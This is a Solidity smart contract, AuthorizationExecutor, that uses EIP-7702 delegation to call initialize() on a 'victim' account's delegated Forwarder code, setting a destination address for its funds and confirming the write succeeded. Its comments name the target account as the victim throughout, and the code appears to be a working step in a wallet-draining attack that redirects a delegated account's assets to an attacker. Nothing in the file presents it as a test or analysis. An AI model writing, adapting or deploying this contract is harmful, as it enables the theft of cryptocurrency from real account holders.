// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

interface IForwarder {
    function initialize(address payable _destination) external;
    function destination() external view returns (address payable);
}

/**
 * @title AuthorizationExecutor
 * @notice One-time helper to initialize the victim EOA's Forwarder storage.
 * @dev Only owner can call. Verifies victim is delegated before & after call.
 */
contract AuthorizationExecutor {
    address public immutable owner;

    error InitializeFailed(address victim, bytes reason);

    event ForwardingSetup(
        address indexed victim,
        address destination,
        bool success
    );

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    function setupForwarding(
        address victim,
        address payable destination
    ) external onlyOwner {
        // 1. Victim must already be delegated (EIP-7702 code prefix 0xef01)
        require(victim.code.length > 0, "Victim not delegated");

        // 2. Call initialize() on victim's storage (delegatecall semantics via EIP-7702)
        (bool success, bytes memory reason) = victim.call(
            abi.encodeWithSelector(IForwarder.initialize.selector, destination)
        );
        emit ForwardingSetup(victim, destination, success);

        if (!success) {
            revert InitializeFailed(victim, reason);
        }

        // 3. Verify destination was actually written (prevents silent failure)
        address actualDest = IForwarder(victim).destination();
        require(actualDest == destination, "Destination not set");
    }
}
